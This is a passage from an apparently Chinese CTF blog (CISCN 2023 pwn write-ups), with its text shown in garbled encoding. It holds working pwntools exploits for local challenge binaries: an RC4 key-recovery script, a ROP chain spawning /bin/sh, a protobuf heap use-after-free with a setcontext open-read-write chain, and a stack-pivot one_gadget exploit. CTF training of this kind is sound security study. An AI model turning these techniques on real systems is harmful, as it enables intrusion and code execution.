class="keyword">def</span> <span class="title function_">rc4_encrypt</span>(<span class="params">data, key1</span>):        <span class="comment"># åŠ å¯†</span></span><br><span class="line">    key = <span class="built_in">bytes</span>(key1, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    enc = ARC4.new(key)</span><br><span class="line">    res = enc.encrypt(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    res=base64.b64encode(res)</span><br><span class="line">    res = <span class="built_in">str</span>(res,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_decrypt</span>(<span class="params">data, key1</span>):        <span class="comment"># è§£å¯†</span></span><br><span class="line">    data = base64.b64decode(data)</span><br><span class="line">    key = <span class="built_in">bytes</span>(key1, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    enc = ARC4.new(key)</span><br><span class="line">    res = enc.decrypt(data)</span><br><span class="line">    res = <span class="built_in">str</span>(res,<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data = <span class="string">&#x27;JLIX8pbSvYZu/WaG&#x27;</span>  <span class="comment"># éœ€è¦è§£å¯†çš„å†…å®¹</span></span><br><span class="line">    key = <span class="string">&#x27;F1nallB1rd3K3y&#x27;</span>  <span class="comment"># åŠ å¯†key</span></span><br><span class="line">    <span class="comment"># encrypt_data = rc4_encrypt(data, key)     # åŠ å¯†æ–¹æ³•</span></span><br><span class="line">    <span class="comment"># print(&#x27;åŠ å¯†å:&#x27;, encrypt_data)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;è§£å¯†å:&#x27;</span>, rc4_decrypt(data, key))         <span class="comment"># è§£å¯†æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># S33UAga1n@#!</span></span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°å¯†é’¥ä¹Ÿå°±æ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°<code>S33UAga1n@#!</code>ã€‚æ¥ä¸‹æ¥å°±å¯ä»¥ä½¿ç”¨ä¸€äº›å‘½ä»¤ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121913251.png" alt="image-20230912191344992" style="zoom:50%;" /><p>æ¼æ´åœ¨ echo å‘½ä»¤ä¸­ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121956386.png" alt="image-20230912195652305" style="zoom:50%;" /><p>è°ƒè¯•å‡ºæ¥çš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./service&quot;</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b&#x27;cert&#x27;</span></span><br><span class="line">p2 = <span class="string">b&#x27;nAcDsMicN&#x27;</span></span><br><span class="line">p3 = <span class="string">b&#x27;S33UAga1n@#!&#x27;</span></span><br><span class="line">payload = p1 + <span class="string">b&quot; &quot;</span> + p2 + <span class="string">b&quot; &quot;</span> + p3</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;ciscnshell$ &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;echo &#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f0</span></span><br><span class="line">payload += <span class="string">b&#x27; &#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;+&#x27;</span>*<span class="number">0x33</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x588018</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040d9e6</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000444fec</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000041e818</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x000000000049e11d</span></span><br><span class="line">syscall = <span class="number">0x000000000040328c</span></span><br><span class="line"></span><br><span class="line">chain = p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(binsh) + p64(pop_rdx_ret) + p64(<span class="number">8</span>) + p64(syscall)</span><br><span class="line">chain += p64(pop_rax_ret) + p64(<span class="number">0x3b</span>) + p64(pop_rdi_ret) + p64(binsh) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">payload += chain</span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *0x04C180B&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># io.send(b&quot;/bin/sh\x00&quot;)</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;nightingale# &quot;</span>, payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-StrangeTalkBot"><a href="#4-StrangeTalkBot" class="headerlink" title="4. StrangeTalkBot"></a>4. StrangeTalkBot</h2><p>ä¸€é“æœ‰å…³<code>protobuf</code>åºåˆ—åŒ–çš„é¢˜ç›®ï¼Œä»ç„¶è®°å¾— 2021 å¹´åä¸œå—èµ›åŒºæœ‰ä¸€é“ä¹Ÿæ˜¯å…³äº<code>protobuf</code>çš„é¢˜ç›®ï¼Œå±å®æ˜¯å›åŠ›é•–æ‰“å›æ¥äº†ã€‚é‚£ä¹ˆæ˜¯æ€ä¹ˆçœ‹å‡ºæ¥ä¸<code>protobuf</code>æœ‰å…³çš„å‘¢ï¼Ÿå®¡è®¡ä»£ç çš„æ—¶å€™å‘ç°å¦‚ä¸‹å­—ç¬¦ä¸²ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309122008358.png" alt="image-20230912200802229" style="zoom:50%;" /><p>å› æ­¤è¿˜è¦å­¦ä¹ <code>.proto</code>çš„ç¼–å†™æ–¹æ³•å’Œ<code>protoc</code>çš„ä½¿ç”¨æ–¹æ³•ï¼Œä¸»è¦å‚è€ƒäº†<a href="https://xz.aliyun.com/t/12580#toc-0">Protobuf Pwnå­¦ä¹ åˆ©ç”¨</a>è¿™ç¯‡æ–‡ç« ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯å¯¹äºæœ‰ protobuf æ ‡å¿—çš„ç¨‹åºå¯ä»¥ç›´æ¥ä½¿ç”¨ pbtk å·¥å…·ç›´æ¥æå–å‡º ctf.protoï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#./extractors/from_binary.py [-h] input_file [output_dir]</span></span><br><span class="line">./extractors/from_binary.py ./pwn ./</span><br></pre></td></tr></table></figure><p>è€Œå¯¹äºæ²¡æœ‰ protobuf æ ‡å¿—çš„ç¨‹åºå°±éœ€è¦è‡ªå·±æ‰‹æ’• ctf.protoï¼Œè¿™é“é¢˜å°±æ˜¯æ²¡æœ‰æ ‡å¿—çš„æƒ…å†µã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line">package ctf;</span><br><span class="line"></span><br><span class="line">message Devicemsg&#123;</span><br><span class="line">    required sint64 actionid = <span class="number">1</span>;</span><br><span class="line">    required sint64 msgidx = <span class="number">2</span>;</span><br><span class="line">    required sint64 msgsize = <span class="number">3</span>;</span><br><span class="line">    required bytes msgcontent = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡<code>protoc</code>å‘½ä»¤ç”Ÿæˆå¯ä¾›ä½¿ç”¨çš„<code>ctf_pb2</code>æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protoc -I=./ --python_out=./ ctf.proto</span><br></pre></td></tr></table></figure><p>é¢˜ç›®å®é™…ä¸Šåªæ˜¯ä¸ª libc2.31 ä¸‹çš„ UAFï¼Œå¼€äº†æ²™ç®±ç¦äº† execveï¼Œæ‰¾ rdi è½¬ rdx çš„ gadget æ‰“ setcontext+61 å³å¯ï¼Œå…³äºå¦‚ä½•æ‰¾åˆ°<code>rdi2rdx</code>çš„ gadgetï¼Œå¯ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">anza@anza-virtual-machine:~/Desktop/pwn/ciscn2023_pri/strangetalkbot$ ROPgadget --binary libc-2.31.so --only <span class="string">&quot;call&quot;</span> | grep rdx</span><br><span class="line">0x0000000000152dcf : call qword ptr [rdx + 0x10]</span><br><span class="line">0x000000000002409b : call qword ptr [rdx + 0x1d0]</span><br><span class="line">0x0000000000151998 : call qword ptr [rdx + 0x20]</span><br><span class="line">0x000000000012aa04 : call qword ptr [rdx + 0x28]</span><br><span class="line">0x000000000015173d : call qword ptr [rdx - 0x11]</span><br><span class="line">0x000000000002fdd3 : call qword ptr [rdx]</span><br><span class="line">0x0000000000030ea3 : call rdx</span><br></pre></td></tr></table></figure><p>æœ‰å…³ gadget ä¸ç®—å¤šï¼Œä¸€ä¸ªä¸ªåœ¨åŸ libc ä¸­æ‰¾ç¬¦åˆçš„å³å¯ã€‚</p><p> exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from ctf_pb2 import *</span></span><br><span class="line"><span class="keyword">import</span> ctf_pb2</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./service&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    msg = ctf_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">1</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = size</span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    payload = msg.SerializeToString()</span><br><span class="line">    io.sendafter(<span class="string">b&quot;You can try to have friendly communication with me now: \n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    msg = ctf_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">4</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload = msg.SerializeToString()</span><br><span class="line">    io.sendafter(<span class="string">b&quot;You can try to have friendly communication with me now: \n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    msg = ctf_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">3</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload = msg.SerializeToString()</span><br><span class="line">    io.sendafter(<span class="string">b&quot;You can try to have friendly communication with me now: \n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    msg = ctf_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">2</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = size</span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    payload = msg.SerializeToString()</span><br><span class="line">    io.sendafter(<span class="string">b&quot;You can try to have friendly communication with me now: \n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="built_in">str</span>(i).encode()*<span class="number">0x80</span>) <span class="comment">#0-6</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x80</span>, <span class="string">b&#x27;8&#x27;</span>*<span class="number">0x80</span>)  <span class="comment">#7</span></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x80</span>, <span class="string">b&#x27;9&#x27;</span>*<span class="number">0x80</span>)  <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">offset = <span class="number">0x7fd9ced4ebe0</span> - <span class="number">0x7fd9ceb62000</span></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - offset</span><br><span class="line">log.success(<span class="string">&quot;libc_base == &gt;&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base == &gt;&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">61</span></span><br><span class="line">magic = libc_base + <span class="number">0x151990</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000022679</span></span><br><span class="line">edit(<span class="number">6</span>, <span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line">heap12 = heap_base + <span class="number">0x13c0</span> + <span class="number">0x10</span></span><br><span class="line">heap13 = heap_base + <span class="number">0x1600</span> + <span class="number">0x20</span></span><br><span class="line">magic_payload = <span class="string">b&#x27;z&#x27;</span>*<span class="number">8</span> + p64(heap12) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(setcontext)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x80</span>, magic_payload)   <span class="comment">#9</span></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x80</span>, p64(magic))   <span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;./flag&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(setcontext)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;t&#x27;</span>) + p64(heap13) + p64(ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0xf0</span>, <span class="string">b&#x27;t&#x27;</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0xf0</span>, payload)    <span class="comment">#11</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">open_addr = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">flag_addr = heap12</span><br><span class="line"></span><br><span class="line">orw = p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(<span class="number">0x20</span>) + p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(<span class="number">0x20</span>) + p64(write_addr)</span><br><span class="line">orw = orw.ljust(<span class="number">0xf0</span>, <span class="string">b&#x27;o&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>, <span class="number">0xf0</span>, orw)    <span class="comment">#12</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io, <span class="string">&quot;b *$rebase(0x1542)&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2023Ciscnåä¸œå—èµ›åŒº"><a href="#2023Ciscnåä¸œå—èµ›åŒº" class="headerlink" title="2023Ciscnåä¸œå—èµ›åŒº"></a>2023Ciscnåä¸œå—èµ›åŒº</h1><p>å‚è€ƒäº†å¤©è™çš„ wpï¼š<a href="https://mp.weixin.qq.com/s/fZQkexelGtulEHKtZ2mJwQ">ciscnå›½èµ›åä¸œå—åˆ†åŒºèµ›PWNæ–¹å‘WriteUpåˆ†äº«</a>ã€‚</p><h2 id="1-login"><a href="#1-login" class="headerlink" title="1. login"></a>1. login</h2><p>è¢«å‡ºé¢˜äººæ°”æ™•ã€‚ä¸€é“çœ‹ä¼¼æ™®é€šçš„æ ˆè¿ç§»é¢˜ç›®ã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309060005178.png" alt="image-20230906000536967" style="zoom:50%;" /><p>å‘1ï¼šæ³„éœ² libc çš„æ—¶å€™è¦æŠ¬æ ˆã€‚</p><p>å‘2ï¼šè¦è¿”å›åˆ°ç¨‹åºçš„ call puts ä¸Šï¼Œè¿”å›å…¶ä»–åœ°å€ä¸çŸ¥ä¸ºä½•ä¼šæŠ¥é”™ã€‚</p><p>å‘3ï¼›æ ˆæº¢å‡ºåç¬¬äºŒæ¬¡æº¢å‡ºäº† 18 ä¸ªå­—èŠ‚ï¼Œä½†ç”±äºæ ˆä¸å¤Ÿé«˜ï¼Œç›´æ¥æ‰“ system(â€œ/bin/sh\x00â€)è¡Œä¸é€šã€‚</p><p>äºæ˜¯ä¹ï¼Œæ‰¾äº†ä¸ªè´¼å¥‡æ€ªçš„ gadget : mov edx, 0x148fff0ï¼Œå¢åŠ æº¢å‡ºé•¿åº¦ï¼Œç„¶åå†æ„é€ æ¡ä»¶æ‰“ one_gadgetï¼Œè°ƒè¯•è°ƒå¾—å¿ƒè‚Œæ¢—è¦å‡ºæ¥äº†ğŸ˜µã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309060009110.png" alt="image-20230906000934067" style="zoom: 50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004013d3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x00000000004013d1</span></span><br><span class="line">leave_ret = <span class="number">0x40136E</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">start = <span class="number">0x4010F0</span></span><br><span class="line">main = <span class="number">0x4012CE</span></span><br><span class="line">magic = <span class="number">0x40134E</span></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">240</span> + p64(bss) + p64(leave_ret)</span><br><span class="line">io.sendafter(<span class="string">b&quot;Enter your password:\n&quot;</span>, payload1)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0x404800</span>)</span><br><span class="line">payload2 += p64(ret)*<span class="number">12</span> + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;alarm&quot;</span>]) + p64(magic)</span><br><span class="line">gdb.attach(io, <span class="string">&quot;b *0x40136E&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendafter(<span class="string">b&quot;Enter your password:\n&quot;</span>, payload2)</span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;alarm&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = <span class="number">0x404060</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0xebcf8</span></span><br><span class="line"></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x404080</span>)*<span class="number">13</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(libc_base+<span class="number">0x011c929</span>)+ p64(elf.sym[<span class="string">&quot;read&quot;</span>]))</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x404080</span>)*<span class="number">13</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(ret)*<span class="number">10</span> + p64(pop_rdx_r12_ret) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(pop_rsi_r15_ret) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-notepad"><a href="#2-notepad" class="headerlink" title="2. notepad"></a>2. notepad</h2><p>è¿™ç§æ¿å­é¢˜ç»ˆäºèƒ½ç‹¬è‡ªåšå‡ºæ¥äº†ğŸ˜­ï¼Œä¸€é“ libc 2.35 çš„ UAF æ¼æ´é¢˜ï¼Œbss ä¸Šç»´æŠ¤äº†å †æŒ‡é’ˆå’Œå † sizeï¼Œé‡Šæ”¾çš„æ—¶å€™åªç½®é›¶äº†å † sizeï¼Œå¯¼è‡´äº† UAF æ¼æ´ã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309061637538.png" alt="image-20230906163750321" style="zoom:50%;" /><p>ç”³è¯·å †çš„æ¬¡æ•°æœ‰ 15 æ¬¡ï¼Œå…ˆé€šè¿‡ unsorted bin æ³„éœ² libcï¼Œå†é€šè¿‡ UAF é€ æˆåŒæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªå †ï¼Œä¸€ä¸ªç”¨æ¥ free ä¸€ä¸ªç”¨æ¥ editã€‚ç”³è¯·åˆ° _IO_list_allï¼Œæ‰“ FILE æ¿å­å°±å¥½äº†ï¼Œæœ€åé€šè¿‡ exit(0) è§¦å‘é“¾å­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 